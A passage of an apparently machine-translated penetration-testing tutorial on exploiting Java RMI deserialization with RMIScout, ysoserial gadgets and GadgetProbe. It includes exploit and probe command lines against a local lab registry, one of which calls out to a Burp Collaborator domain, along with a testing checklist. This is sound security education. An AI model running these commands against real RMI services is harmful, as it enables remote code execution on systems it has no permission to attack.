data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zQFJ6STRqH80AgegCrBhQQ.png"/></div></div></figure><p id="58d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">论据如下:</p><p id="bb47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-s代表方法签名，取自接口</p><p id="baa2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-p是ysoserial的有效负载，取自其类路径。路径ysoserial.payloads上所有可用的类都可以在<a class="ae kl" href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads" rel="noopener ugc nofollow" target="_blank">这里</a>找到——它们只是ysoserial使用的相同的有效载荷</p><p id="3eb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-c是ysoserial有效负载的命令</p><p id="1092" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-n是注册表名称</p><p id="6a6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后两个参数是目标注册表的主机和端口。</p><p id="05a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行后，不管错误怎么说，有效负载被调用。文件已经在<em class="mt"> /tmp/ </em>中创建，你也可以在服务器的输出中看到数据已经被处理。</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nq"><img src="../Images/e93974989f3e166a1320b1455beb962c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Jv7RR9tqzOjdFVn_-G1KDg.png"/></div></div></figure><h1 id="318c" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">2020年6月:字符串和原语的问题</h1><p id="3228" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">我已经说过，您不能通过滥用以原语作为参数的函数来利用RMI接口。不幸的是，在2020年6月发布补丁后，字符串也是如此。我不会再张贴接口的更新源代码—只是为了让您知道，我只是添加了返回一个字符串(返回类型与漏洞无关)并以一个字符串数据类型作为参数(这是这里重要的)的示例函数。让我们从尝试执行<em class="mt">回声字符串</em>方法开始。</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="f92c" class="ly kn iq lu b gy lz ma l mb mc">./rmiscout.sh exploit -s ‘String echoString(String x)’ -p ysoserial.payloads.Groovy1 -c “touch /tmp/grovyString” -n RMIInterface localhost 11098</span></pre><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nr"><img src="../Images/f2a662ecbbbb31132a96e784d06a8dfa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SNiNhtPMgGxKfvlUl4T9rQ.png"/></div></div></figure><p id="3122" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">什么都没发生。这是因为，根据<a class="ae kl" href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/" rel="noopener ugc nofollow" target="_blank">已经提到的文章</a>，在2020年6月已经添加了另一个补丁，它以保护原语类型的相同方式保护字符串类型免受任意反序列化。链接的文章包含进一步的技术信息以及所提到的补丁的源代码。</p><p id="3710" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们现在尝试从远程接口执行另一个方法，该方法将Class作为参数—同样，代码执行工作正常。</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ns"><img src="../Images/34d70e950923b543a215396c8aa66f11.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MzDyEnav4_Ifj9uYFaugwg.png"/></div></div></figure><p id="0051" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再来看另一个原语的例子:<em class="mt">int</em>vs Java . lang .<em class="mt">Integer</em>。接口(和服务器)被修改为包含两个函数:一个接受一个<em class="mt"> int </em>(原语)，另一个接受<em class="mt">Java . lang . integer</em>(int的包装类)作为参数。正如您在下面的截图中看到的，只有攻击后者才会导致代码执行。</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nt"><img src="../Images/818143d99d2b2ec112deaa4863c3d2ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ccSUbW_8Wx-HHpntOyJAJw.png"/></div></div></figure><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nu"><img src="../Images/2cd6c96d88a30fed94567549211fbde1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uIJ6dnaCYwa1qafsxadPTQ.png"/></div></div></figure><h1 id="838e" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">额外步骤:探测远程类路径</h1><p id="c19c" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">与RMIScout一起发布的还有另一个值得一试的工具——它被命名为GadgetProbe。如果你不熟悉术语“小工具”，你一定要仔细看看Java反序列化的主题(<a class="ae kl" href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" rel="noopener ugc nofollow" target="_blank">https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet</a>)</p><p id="8ba0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之，小工具是在目标应用程序(或者在本例中是注册表)类路径中可用的某些java类。java小工具的某些组合允许创建恶意的“小工具链”，如果以未经验证的方式反序列化该链，则可能导致目标应用程序受损。危害影响可能因DNS解析和代码执行而异。Ysoserial(以及与其相关的工具，如Burp的Java反序列化扫描器或漏洞模式下的RMIScout)用于生成利用不安全反序列化的小工具链。</p><p id="abdc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">GadgetProbe依赖于反序列化一个通用小工具——URL DNS。这个ysoserial的有效负载总是有效的(它只是强制在反序列化端点上进行DNS查找),只要它是针对任意的(任意意味着在反序列化过程中没有类型检查)反序列化抛出的。因此，在这种情况下，您可以将任何采用非原始(或字符串)数据类型作为参数的方法作为目标。</p><p id="feab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">探测远程类路径上的类可能有助于您理解ysoserial的工具包中的哪个gadget应该对某个接口有效，只要您已经通过DNS交互检测到不安全的反序列化。简单地说——DNS交互是一个PoC(就像xss中的<em class="mt"> alert(1) </em>),为了产生影响，您需要找到小工具，然后使用由可用小工具组成的适当有效负载，最终实现RCE(或其他与目标的严重交互，如文件写入/删除等)。)</p><p id="398e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我从GitHub下载了GadgetProbe并构建了它:</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nv"><img src="../Images/9aa405fb09305f5455ca0b9fa5f251d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*scuGMg1u4ZmCQ9_MRsl3LQ.png"/></div></div></figure><p id="7b17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">截图上显示的RMIRegistry与本文开头用nmap扫描的是同一个注册表。现在，为了准备运行Gadgetprobe，为了展示它的能力，我在<em class="mt">gadget probe/word lists/maven popular . list</em>更改了它的默认单词列表</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nw"><img src="../Images/8eb89343788166120d1161edfb3edb99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FtYAsUw_TXK2VX1AV6L0bA.png"/></div></div></figure><p id="9da3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简单地说，<em class="mt">“java.lang.String”</em>被添加到类单词列表的末尾，因为它肯定会在目标类路径中——这是因为Java . lang . string是一个本机的、广泛使用的类。</p><p id="eed9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在下一步中，我将使用BurpPro Collaborator客户机来生成一个Collaborator链接。我将把它粘贴到命令行，让RMIScout使用GadgetProbe探测远程类路径:</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="9cef" class="ly kn iq lu b gy lz ma l mb mc">./rmiscout.sh probe -s ‘String echo(java.lang.Object qwewqe)’ -i ../GadgetProbe/wordlists/maven_popular.list -d “av9nuav4lhol8ytlc9ut2ditlkrgf5.burpcollaborator.net” -n RMIInterface localhost 11099</span></pre><p id="5696" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我解释一下这里发生了什么:</p><p id="2fda" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们采用之前从RMIScout的枚举过程中获得的方法。这是被发现的回声方法，</p><p id="d6fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它正在RMIScout中运行，带有探针参数，该参数还与maven_popular单词表相关联</p><p id="7125" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">附加参数通知RMIScout关于dns端点的信息，如果远程类路径上也存在单词列表中的类，将解析该端点</p><p id="bac5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它还获取关于注册表绑定、端口和主机的信息</p><p id="90dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行后，可以看到<em class="mt"> java.lang.String </em>已经被解析！</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nx"><img src="../Images/a0a7e43a6707bda558aefd4cf04de030.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2CtiqvFwoCuYEeYJ9z962g.png"/></div></div></figure><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ny"><img src="../Images/1a401740eb0d365c04b3ca6450472379.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xEZctTFLCiYhnC6OiR64eA.png"/></div></div></figure><p id="4d99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，白色文本不是正在执行的方法的证明。<strong class="jp ir">你应该依靠DNS交互</strong>，在这种情况下，可以在burp中看到。</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nz"><img src="../Images/4c8fb6ff334d687635a8325eab84f0a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JVpq4dKMS2R4-iMSGhITaA.png"/></div></div></figure><p id="adb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如已经说过的，DNS交互是“通用小工具”之一，因为它依赖于本地java类，这就是为什么在探测机制中使用它如此可靠。此外，向您的类单词列表中添加一些像java.lang.String这样的“始终为真”的类是一个好主意，这样，如果您甚至找不到它们，您就可以推断出已经有了对策。</p><h1 id="8a16" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">摘要</h1><p id="bf45" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">总而言之，非JMX RMI接口(那些没有<em class="mt">实现javax . management . remote . RMI . RMI server</em>的接口)的测试包括以下步骤:</p><p id="c085" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用Nmap转储注册表信息的侦测</p><p id="a978" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查invocationhandler是否可访问，否则调整网络/DNS设置</p><p id="c852" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果可能的话，尝试在线或在源代码中找到远程接口</p><p id="28a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">否则，尝试使用RMIScout猜测方法</p><p id="d701" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可选:尝试探测远程类路径上的小工具，或者</p><p id="09b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">寻找一个使用非原始类型作为参数的方法</p><p id="7586" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试用RMIScout漏洞利用模式执行它，记住:</p><p id="a4b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">o原语和字符串不能被反序列化</p><p id="891d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">o远程类路径需要包含易受攻击的小工具库</p><p id="3284" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">o其他定制的反序列化过滤器可能已经就位——但是，除非您有白盒访问权限，否则还不能确定RCE是否可行</p><p id="d4ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">毫无疑问，最近的补丁使得RMI注册中心(仍然说非JMX注册中心，因为JMXRMI几乎没有其他技术)更难被利用。但是，他们仍然值得考察，因为潜在的RCE总是一个值得花时间的奖励。</p><p id="31fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">作者:</strong>卢卡斯·米库拉——渗透测试仪&amp;研发负责人&amp; D @ AFINE。在LinkedIn(【https://www.linkedin.com/in/lukaszmikula/】)或Twitter(<a class="ae kl" href="https://twitter.com/0xluk3" rel="noopener ugc nofollow" target="_blank">https://twitter.com/0xluk3</a>)上关注我</p><p id="2eb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">参考文献:</strong></p><p id="6051" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://github.com/frohoff/ysoserial" rel="noopener ugc nofollow" target="_blank">https://github.com/frohoff/ysoserial</a><br/><a class="ae kl" href="https://www.programmersought.com/article/22724621036/" rel="noopener ugc nofollow" target="_blank">https://www.programmersought.com/article/22724621036/</a><br/><a class="ae kl" href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/" rel="noopener ugc nofollow" target="_blank">https://mogwailabs . de/en/blog/2019/03/attaking-Java-RMI-services-after-jep-290/</a><br/><a class="ae kl" href="https://en.wikibooks.org/wiki/Java_Programming/Primitive_Types" rel="noopener ugc nofollow" target="_blank">https://en . wikibooks . org/wiki/Java _ Programming/Primitive _ Types</a><br/><a class="ae kl" href="https://programming.guide/java/wrapper-types.html" rel="noopener ugc nofollow" target="_blank">https://programming.guide/java/wrapper-types.html</a><br/><a class="ae kl" href="https://github.com/BishopFox/rmiscout" rel="noopener ugc nofollow" target="_blank">https://github.com/BishopFox/rmiscout</a></p></div></div>    
</body>
</html>